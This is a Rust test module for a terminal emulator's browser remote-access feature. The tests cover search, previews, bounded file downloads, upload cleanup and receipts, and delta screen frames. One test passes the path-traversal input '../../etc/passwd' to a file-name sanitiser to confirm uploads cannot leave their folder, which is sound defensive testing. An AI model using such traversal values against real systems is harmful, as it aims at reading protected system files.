        RowText {
            row,
            text: text.to_lowercase(),
            cols,
            ends,
        }
    }

    #[test]
    fn search_walks_matches_in_both_directions() {
        let rows = vec![
            rt(10, "error one"),
            rt(11, "fine"),
            rt(12, "中文 error two error"),
        ];
        // "中文 " takes five cells, so the matches start at columns 5 and 15.
        // From the bottom, older first: the last match in the newest row.
        let older = |from| find_in_rows(&rows, "error", from, true);
        assert_eq!(older(None), Some((12, 15, 5)));
        assert_eq!(older(Some((12, 15))), Some((12, 5, 5)));
        assert_eq!(older(Some((12, 5))), Some((10, 0, 5)));
        assert_eq!(older(Some((10, 0))), None);
        // And newer from there.
        let newer = find_in_rows(&rows, "error", Some((10, 0)), false);
        assert_eq!(newer, Some((12, 5, 5)));
        // Wide characters take two cells.
        assert_eq!(find_in_rows(&rows, "中文", None, true), Some((12, 0, 4)));
    }

    #[test]
    fn clicked_paths_resolve_from_home_and_the_pane() {
        let home = config::HOME_DIR.clone();
        assert_eq!(
            download_path("~/Desktop/a.png", None),
            Some(home.join("Desktop/a.png"))
        );
        assert_eq!(download_path("/tmp/a.png", None), Some("/tmp/a.png".into()));
        assert_eq!(
            download_path("out/a.png", Some("/work".into())),
            Some("/work/out/a.png".into())
        );
        // A relative path with no known working directory is not guessed.
        assert_eq!(download_path("a.png", None), None);
    }

    #[test]
    fn a_path_check_parses_and_answers_in_order() {
        let msg: WebClientMsg =
            serde_json::from_str(r#"{"type":"paths_exist","id":3,"paths":["~/a","b"],"pane_id":2}"#).unwrap();
        assert!(matches!(msg, WebClientMsg::PathsExist { id: 3, ref paths, pane_id: Some(2) } if paths.len() == 2));
        assert_eq!(
            encode(&WebServerMsg::PathsExist { id: 3, exists: vec![true, false] }).unwrap(),
            r#"{"type":"paths_exist","id":3,"exists":[true,false]}"#
        );
    }

    #[test]
    fn a_hover_preview_is_scaled_to_the_side_the_page_shows() {
        let dir = std::env::temp_dir().join(format!("kaku-preview-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        // A Retina screenshot: noisy enough that its PNG runs to megabytes.
        let mut seed = 7u32;
        let shot = image::RgbImage::from_fn(3024, 1964, |x, y| {
            seed ^= seed << 13;
            seed ^= seed >> 17;
            seed ^= seed << 5;
            image::Rgb([(x % 256) as u8, (y % 256) as u8, (seed & 0x3f) as u8])
        });
        let path = dir.join("shot.png");
        shot.save(&path).unwrap();
        let size = std::fs::metadata(&path).unwrap().len();
        assert!(size > 4 << 20, "fixture is {size} bytes");
        let started = std::time::Instant::now();
        let bytes = preview_bytes(&path, 924).unwrap();
        let took = started.elapsed();
        let picture = image::load_from_memory(&bytes).unwrap();
        assert_eq!(
            image::guess_format(&bytes).unwrap(),
            image::ImageFormat::Jpeg
        );
        assert_eq!((picture.width(), picture.height()), (924, 600));
        assert!(bytes.len() < 400 << 10, "{} bytes in {took:?}", bytes.len());

        // Transparency stays: PNG.
        let clear = image::RgbaImage::from_fn(3000, 2000, |x, y| {
            image::Rgba([
                (x % 256) as u8,
                (y % 256) as u8,
                ((x ^ y) % 256) as u8,
                (x % 200) as u8,
            ])
        });
        let path = dir.join("clear.png");
        clear.save(&path).unwrap();
        let bytes = preview_bytes(&path, 600).unwrap();
        assert_eq!(
            image::guess_format(&bytes).unwrap(),
            image::ImageFormat::Png
        );
        assert_eq!(image::load_from_memory(&bytes).unwrap().width(), 600);

        // A macOS screenshot carries an alpha channel that is opaque
        // throughout; it is not transparent, so JPEG.
        let opaque = image::RgbaImage::from_fn(3000, 2000, |x, y| {
            image::Rgba([(x % 256) as u8, (y % 256) as u8, ((x ^ y) % 256) as u8, 255])
        });
        let path = dir.join("opaque.png");
        opaque.save(&path).unwrap();
        let bytes = preview_bytes(&path, 600).unwrap();
        assert_eq!(
            image::guess_format(&bytes).unwrap(),
            image::ImageFormat::Jpeg
        );

        // Small files and files the decoder does not know go as they are.
        let small = dir.join("small.png");
        std::fs::write(&small, b"not really a png").unwrap();
        assert_eq!(preview_bytes(&small, 600).unwrap(), b"not really a png");
        let odd = dir.join("odd.bmp");
        let odd_bytes: Vec<u8> = (0..400_000u32).map(|i| (i % 251) as u8).collect();
        std::fs::write(&odd, &odd_bytes).unwrap();
        assert_eq!(preview_bytes(&odd, 600).unwrap(), odd_bytes);
        assert!(preview_bytes(&dir.join("missing.png"), 600).is_err());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_download_sends_a_bounded_window_and_the_exact_bytes() {
        use base64::Engine as _;
        let dir = std::env::temp_dir().join(format!("kaku-dl-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("shot.png");
        let bytes: Vec<u8> = (0..3_000_000u32).map(|i| (i % 251) as u8).collect();
        std::fs::write(&path, &bytes).unwrap();
        let mut downloads = HashMap::new();
        let parse = |out: Vec<String>| -> Vec<serde_json::Value> {
            out.iter()
                .map(|j| serde_json::from_str(j).unwrap())
                .collect()
        };
        let request = WebClientMsg::Download {
            id: 1,
            path: path.display().to_string(),
            pane_id: None,
            preview: None,
        };
        let first = parse(handle_download(&request, &mut downloads, |_| None).unwrap());
        assert_eq!(first[0]["type"], "file_start");
        assert_eq!(first[0]["size"], 3_000_000);
        let mut got = Vec::new();
        let take = |got: &mut Vec<u8>, msgs: &[serde_json::Value]| {
            for m in msgs.iter().filter(|m| m["type"] == "file_chunk") {
                let chunk = base64::engine::general_purpose::STANDARD
                    .decode(m["data"].as_str().unwrap())
                    .unwrap();
                assert!(
                    chunk.len() <= 64 * 1024,
                    "each chunk leaves room for terminal input"
                );
                got.extend(chunk);
            }
        };
        take(&mut got, &first);
        // Nothing past the window goes out before the page acknowledges.
        assert!(got.len() as u64 <= DOWNLOAD_WINDOW);
        assert!(
            got.len() <= 256 * 1024,
            "a file cannot queue a megabyte ahead of typing"
        );
        assert!(!first.iter().any(|m| m["type"] == "file_end"));
        let mut ended = false;
        for _ in 0..bytes.len().div_ceil(DOWNLOAD_WINDOW as usize) {
            let ack = WebClientMsg::DownloadAck {
                id: 1,
                received: got.len() as u64,
            };
            let before = got.len();
            let next = parse(handle_download(&ack, &mut downloads, |_| None).unwrap());
            take(&mut got, &next);
            assert!((got.len() - before) as u64 <= DOWNLOAD_WINDOW);
            if next.iter().any(|m| m["type"] == "file_end") {
                ended = true;
                break;
            }
        }
        assert!(ended);
        assert_eq!(got, bytes);
        assert!(downloads.is_empty());
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn folders_missing_and_huge_files_are_refused_by_name() {
        let dir = std::env::temp_dir().join(format!("kaku-dl-refuse-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let huge = dir.join("huge.bin");
        std::fs::File::create(&huge)
            .unwrap()
            .set_len(MAX_DOWNLOAD_BYTES + 1)
            .unwrap();
        let refused = |path: &std::path::Path| {
            let mut downloads = HashMap::new();
            let msg = WebClientMsg::Download {
                id: 9,
                path: path.display().to_string(),
                pane_id: None,
                preview: None,
            };
            let out = handle_download(&msg, &mut downloads, |_| None).unwrap();
            let reply: serde_json::Value = serde_json::from_str(&out[0]).unwrap();
            assert_eq!(reply["type"], "file_error");
            reply["detail"].as_str().unwrap().to_string()
        };
        assert!(refused(&dir).ends_with("is a folder"));
        assert!(refused(&dir.join("missing.png")).ends_with("was not found"));
        assert!(refused(&huge).ends_with("larger than 50 MB"));
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_page_cannot_hold_open_more_than_a_few_downloads() {
        let dir = std::env::temp_dir().join(format!("kaku-dl-cap-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("big.bin");
        std::fs::write(&path, vec![1u8; 1 << 20]).unwrap();
        let mut downloads = HashMap::new();
        let ask = |id: u32, downloads: &mut HashMap<u32, Download>| {
            let msg = WebClientMsg::Download {
                id,
                path: path.display().to_string(),
                pane_id: None,
                preview: None,
            };
            let out = handle_download(&msg, downloads, |_| None).unwrap();
            serde_json::from_str::<serde_json::Value>(&out[0]).unwrap()["type"]
                .as_str()
                .unwrap()
                .to_string()
        };
        // None of these is acknowledged, so each stays open.
        for id in 0..MAX_DOWNLOADS as u32 {
            assert_eq!(ask(id, &mut downloads), "file_start");
        }
        assert_eq!(ask(999, &mut downloads), "file_error");
        assert_eq!(downloads.len(), MAX_DOWNLOADS);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn chunks_are_acknowledged_and_unfinished_uploads_are_removed() {
        use base64::Engine as _;
        let path = std::env::temp_dir().join(format!("kaku-upload-test-{}", std::process::id()));
        let mut uploads = Uploads::default();
        uploads.0.insert(
            7,
            Upload {
                file: std::fs::File::create(&path).unwrap(),
                path: path.clone(),
                size: 6,
                written: 0,
                pane_id: None,
                transfer: String::new(),
                name: String::new(),
            },
        );
        let chunk = WebClientMsg::UploadChunk {
            id: 7,
            data: base64::engine::general_purpose::STANDARD.encode(b"abc"),
        };
        let reply = handle_upload(&chunk, &mut uploads.0, None).expect("a chunk is acknowledged");
        assert_eq!(reply.received, Some(3));
        assert!(matches!(
            reply.as_msg(),
            WebServerMsg::UploadAck { id: 7, received: 3 }
        ));
        // The session ends before upload_end: the partial file goes.
        assert!(path.exists());
        drop(uploads);
        assert!(!path.exists());
    }

    #[test]
    fn an_incomplete_upload_cannot_be_completed() {
        let path = std::env::temp_dir().join(format!("kaku-incomplete-{}", std::process::id()));
        let mut uploads = Uploads::default();
        uploads.0.insert(
            99,
            Upload {
                file: std::fs::File::create(&path).unwrap(),
                path: path.clone(),
                size: 6,
                written: 0,
                pane_id: None,
                transfer: String::new(),
                name: String::new(),
            },
        );
        let result =
            handle_upload(&WebClientMsg::UploadEnd { id: 99 }, &mut uploads.0, None).unwrap();
        // Remove our fixture even on the old implementation, which keeps it.
        let remains = path.exists();
        let _ = std::fs::remove_file(path);
        assert!(!result.ok, "no data reached the Mac");
        assert!(!remains, "unfinished file is discarded");
    }

    #[test]
    fn a_desktop_upload_pastes_nowhere() {
        let msg: WebClientMsg =
            serde_json::from_str(r#"{"type":"upload_start","id":1,"name":"a","size":1}"#).unwrap();
        assert!(matches!(msg, WebClientMsg::UploadStart { paste: true, .. }));
        assert_eq!(upload_target(None, true, Some(9)), Some(9));
        assert_eq!(upload_target(Some(4), true, Some(9)), Some(4));
        assert_eq!(upload_target(Some(4), false, Some(9)), None);
        assert_eq!(upload_target(None, false, Some(9)), None);
    }

    #[test]
    fn completed_upload_receipt_survives_reconnect_without_pasting_again() {
        let path = std::env::temp_dir().join(format!("kaku-receipt-{}", std::process::id()));
        let transfer = "ab".repeat(16);
        let mut uploads = HashMap::new();
        uploads.insert(
            7,
            Upload {
                file: std::fs::File::create(&path).unwrap(),
                path: path.clone(),
                size: 0,
                written: 0,
                pane_id: Some(42),
                transfer: transfer.clone(),
                name: "empty.txt".into(),
            },
        );
        // Focus has moved to 99, but completion belongs to 42.
        let first =
            handle_upload(&WebClientMsg::UploadEnd { id: 7 }, &mut uploads, Some(99)).unwrap();
        assert!(first.ok);
        assert_eq!(
            UPLOAD_RECEIPTS.lock().get(&transfer).unwrap().pane_id,
            Some(42)
        );
        // A fresh session repeats the start after losing the final reply.
        let mut reconnected = HashMap::new();
        let reply = handle_upload(
            &WebClientMsg::UploadStart {
                id: 8,
                name: "empty.txt".into(),
                size: 0,
                transfer: transfer.clone(),
                pane_id: Some(42),
                paste: true,
            },
            &mut reconnected,
            Some(99),
        )
        .unwrap();
        assert!(reply.ok);
        assert_eq!(reply.detail, first.detail);
        assert!(
            reconnected.is_empty(),
            "a completed retry never opens a second file"
        );
        let mismatch = handle_upload(
            &WebClientMsg::UploadStart {
                id: 9,
                name: "different.txt".into(),
                size: 0,
                transfer: transfer.clone(),
                pane_id: Some(42),
                paste: true,
            },
            &mut reconnected,
            Some(99),
        )
        .unwrap();
        assert!(!mismatch.ok);
        UPLOAD_RECEIPTS.lock().remove(&transfer);
        std::fs::remove_file(path).unwrap();
    }

    #[test]
    fn cancelled_upload_discards_only_its_partial_file() {
        let path = std::env::temp_dir().join(format!("kaku-cancel-{}", std::process::id()));
        let mut uploads = HashMap::new();
        uploads.insert(
            7,
            Upload {
                file: std::fs::File::create(&path).unwrap(),
                path: path.clone(),
                size: 5,
                written: 0,
                pane_id: Some(42),
                transfer: String::new(),
                name: "partial".into(),
            },
        );
        assert!(handle_upload(&WebClientMsg::UploadCancel { id: 7 }, &mut uploads, None).is_none());
        assert!(!path.exists());
        assert!(uploads.is_empty());
    }

    #[test]
    fn matching_dimensions_still_record_browser_ownership() {
        let source = include_str!("web.rs");
        let claim = source
            .split("pub fn claim_tab_size_on_gui_thread(")
            .nth(1)
            .unwrap()
            .split("struct Frame {")
            .next()
            .unwrap();
        assert!(
            claim.contains(".iter_panes()"),
            "zoomed panes must use their visible size"
        );
        assert!(
            claim
                .find("WEB_SIZED_TABS.lock().insert(tab_id.into());")
                .unwrap()
                < claim
                    .find("if current.cols == cols && current.rows == rows {")
                    .unwrap()
        );
    }

    #[test]
    fn browser_zoom_carries_only_its_attached_pane_claim() {
        let source = include_str!("web.rs");
        let zoom = source
            .split("WebClientMsg::ZoomPane { pane_id } => {")
            .nth(1)
            .unwrap()
            .split("WebClientMsg::CloseTab")
            .next()
            .unwrap();
        assert!(zoom.contains("if PaneId::from(pane_id) == pane.pane_id() {"));
        assert!(zoom.contains("view.claimed"));
        assert!(zoom.contains("} else {\n                    None\n                }"));
        assert!(zoom.contains("TabAction::Zoom { pane_id, claimed }"));
    }

    #[test]
    fn browser_zoom_reclaims_in_the_same_gui_callback() {
        let source = include_str!("../../../kaku-gui/src/remote_tabs.rs");
        let zoom = source
            .split("TabAction::Zoom { claimed, .. } => {")
            .nth(1)
            .unwrap()
            .split("TabAction::Rename")
            .next()
            .unwrap();
        let toggled = zoom.find("tab.toggle_zoom();").unwrap();
        let reclaimed = zoom
            .find("claim_tab_size_on_gui_thread(pane_id.into(), cols, rows);")
            .unwrap();
        assert!(toggled < reclaimed);
        assert!(zoom.contains("if let Some((cols, rows)) = claimed {"));
        assert!(!zoom.contains("spawn"));
    }

    #[test]
    fn less_without_alt_screen_receives_scroll_keys() {
        for process in [Some("less"), Some("/usr/bin/less")] {
            assert!(!local_scroll_allowed(false, false, process));
        }
        for process in [None, Some("/bin/zsh"), Some("/usr/bin/lesspipe")] {
            assert!(local_scroll_allowed(false, false, process));
            assert!(!local_scroll_allowed(true, false, process));
            assert!(!local_scroll_allowed(false, true, process));
        }
    }

    #[test]
    fn uploaded_names_cannot_leave_the_folder() {
        assert_eq!(safe_file_name("../../etc/passwd"), "passwd");
        assert_eq!(safe_file_name("C:\\Users\\a\\shot.png"), "shot.png");
        assert_eq!(safe_file_name(".bashrc"), "bashrc");
        assert_eq!(safe_file_name(""), "file");
        assert_eq!(safe_file_name("..."), "file");
        assert_eq!(safe_file_name("a\u{7}b.md"), "ab.md");
        let dir = tempfile_dir();
        std::fs::write(dir.join("note.md"), "x").unwrap();
        assert_eq!(unused_path(&dir, "note.md"), dir.join("note (2).md"));
        assert_eq!(unused_path(&dir, "new.md"), dir.join("new.md"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn tempfile_dir() -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("kaku-web-upload-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn key_names_map_to_kaku_key_codes() {
        assert_eq!(key_code("Enter"), Some(KeyCode::Enter));
        assert_eq!(key_code("ArrowUp"), Some(KeyCode::UpArrow));
        assert_eq!(key_code("F5"), Some(KeyCode::Function(5)));
        assert_eq!(key_code("c"), Some(KeyCode::Char('c')));
        assert_eq!(key_code("F99"), None);
        assert_eq!(key_code("Unidentified"), None);
    }

    #[derive(Debug)]
    struct ReplayConfig;
    impl wezterm_term::TerminalConfiguration for ReplayConfig {
        fn color_palette(&self) -> ColorPalette {
            ColorPalette::default()
        }
    }

    fn replay_term(cols: usize, rows: usize) -> wezterm_term::Terminal {
        wezterm_term::Terminal::new(
            TerminalSize {
                rows,
                cols,
                ..Default::default()
            },
            Arc::new(ReplayConfig),
            "test",
            "0",
            Box::new(Vec::new()),
        )
    }

    /// The frame a pane showing `output` would produce.
    fn term_frame(cols: usize, rows: usize, output: &str) -> Frame {
        let mut source = replay_term(cols, rows);
        source.advance_bytes(output);
        let screen = source.screen();
        let lines = screen.lines_in_phys_range(screen.phys_range(&(0..rows as i64)));
        let (lines, cells) = screen_rows(&lines, rows, cols, &ColorPalette::default());
        Frame {
            cells,
            ..frame(
                cols,
                &lines.iter().map(String::as_str).collect::<Vec<_>>(),
                "",
            )
        }
    }

    fn page_cells(page: &wezterm_term::Terminal, cols: usize) -> Vec<Vec<RowCell>> {
        let palette = ColorPalette::default();
        let screen = page.screen();
        screen
            .lines_in_phys_range(screen.phys_range(&(0..screen.physical_rows as i64)))
            .iter()
            .map(|line| row_cells(line, cols, &palette))
            .collect()
    }

    /// Claude Code's spinner, a shorter and a longer status, wide glyphs:
    /// a page that applies only the changed cells ends up with the same
    /// screen as the pane, in fewer bytes than whole rows.
    #[test]
    fn partial_rows_draw_the_same_screen_as_whole_rows() {
        let (cols, rows) = (40, 5);
        let screens = [
            "\x1b[31m✢\x1b[0m Recombobulating… \x1b[2m(2m 23s · 4.6k tokens)\x1b[0m\r\n> \r\n中文 abc 🙂 end",
            "\x1b[31m✳\x1b[0m Recombobulating… \x1b[2m(2m 24s · 4.7k tokens)\x1b[0m\r\n> \r\n中文 abc 🙂 end",
            "\x1b[31m✳\x1b[0m Done\r\n> \r\n中文 abd 🙂 end",
            "\x1b[34m✳\x1b[0m Done, and a much longer line\r\n> hi\r\n汉字 abd 🙂 end",
            "\x1b[34m✳\x1b[0m Done, and a much longer line\r\n> \r\n汉字 abd 🙂",
        ];
        let mut shown = Shown::default();
        let mut page = replay_term(cols, rows);
        // The same page fed every row whole, as before rows went in parts.
        let mut whole_page = replay_term(cols, rows);
        let mut whole_shown = Shown::default();
        let mut partial_bytes = 0;
        let mut whole_bytes = 0;
        for (i, screen) in screens.iter().enumerate() {
            let frame = term_frame(cols, rows, screen);
            whole_page.advance_bytes(frame.lines.concat());
            // Without cells, `Shown` sends changed rows whole.
            let (_, whole) = whole_shown
                .update(Frame {
                    cells: Vec::new(),
                    ..term_frame(cols, rows, screen)
                })
                .unwrap();
            let (_, data) = shown.update(frame).unwrap();
            page.advance_bytes(&data);
            assert_eq!(
                page_cells(&page, cols),
                page_cells(&whole_page, cols),
                "screen {i}"
            );
            if i > 0 {
                partial_bytes += data.len();
                whole_bytes += whole.len();
            }
        }
        assert!(
            partial_bytes < whole_bytes,
            "{partial_bytes} bytes for changed cells, {whole_bytes} for changed rows"
        );
    }

    #[test]
    fn a_spinner_tick_sends_only_the_glyph_that_changed() {
        let mut shown = Shown::default();
        shown
            .update(term_frame(40, 2, "\x1b[31m✢\x1b[0m Working (1s)"))
            .unwrap();
        let (_, data) = shown
            .update(term_frame(40, 2, "\x1b[31m✳\x1b[0m Working (1s)"))
            .unwrap();
        assert_eq!(data, "\x1b[?25l\x1b[1;1H\x1b[0;38;5;1m✳\x1b[2G");
    }

    /// A page that asked for deltas gets the title and wrap flags only when
    /// they change, and always in the first frame after a reset.
    #[test]
    fn unchanged_title_and_wrap_flags_are_marked() {
        let mut shown = Shown::default();
        let (first, _) = shown.update(frame(10, &["A"], "")).unwrap();
        assert!(first.title_changed && first.wrapped_changed);
        assert!(first.layout_changed);
        let (second, _) = shown.update(frame(10, &["B"], "")).unwrap();
        assert!(!second.title_changed && !second.wrapped_changed && !second.layout_changed);
        let (wider, _) = shown.update(frame(12, &["B"], "")).unwrap();
        assert!(wider.layout_changed && !wider.title_changed);
        let (third, _) = shown
            .update(Frame {
                title: "u".into(),
                ..frame(10, &["C"], "")
            })
            .unwrap();
        assert!(third.title_changed && !third.wrapped_changed);
        let mut shown = Shown::default();
        let (reset, _) = shown.update(frame(10, &["C"], "")).unwrap();
        assert!(reset.title_changed && reset.wrapped_changed);
    }

    #[test]
    fn frames_leave_out_what_a_delta_page_already_has() {
        let msg = WebServerMsg::Frame {
            seq: 1,
            pane_id: None,
            cols: None,
            rows: None,
            title: None,
            scrolled: None,
            local_scroll: None,
            data: "x",
            wrapped: None,
            images: None,
        };
        let json = encode(&msg).unwrap();
        assert_eq!(json, r#"{"type":"frame","seq":1,"data":"x"}"#);
        let hello: WebClientMsg =
            serde_json::from_str(r#"{"type":"hello","frame_ack":true}"#).unwrap();
        assert!(matches!(hello, WebClientMsg::Hello { delta: false, .. }));
    }

    /// Must match `rowsDigest` in the page, which hashes what xterm.js shows.
    #[test]
    fn rows_digest_matches_the_page() {
        let rows = vec![
            "\x1b[1;1H\x1b[0;31m✳\x1b[0m Hi 中文\x1b[0m\x1b[K".to_string(),
            "\x1b[2;1H\x1b[0m\x1b[K".to_string(),
            "\x1b[3;1H\x1b[0m a b\x1b[0m\x1b[K".to_string(),
            "\x1b[4;1H\x1b[0m\x1b[K".to_string(),
        ];
        // FNV-1a 32 of "✳Hi中文\n\nab", computed by the page's function.
        assert_eq!(rows_digest(&rows), 0x9366_54e8);
        assert_eq!(rows_digest(&rows[..3]), rows_digest(&rows));
        let verify: WebClientMsg =
            serde_json::from_str(r#"{"type":"verify","frames":3,"digest":7,"seq":3}"#).unwrap();
        assert!(matches!(
            verify,
            WebClientMsg::Verify { digest: Some(7), ref rows, .. } if rows.is_empty()
        ));
    }
}
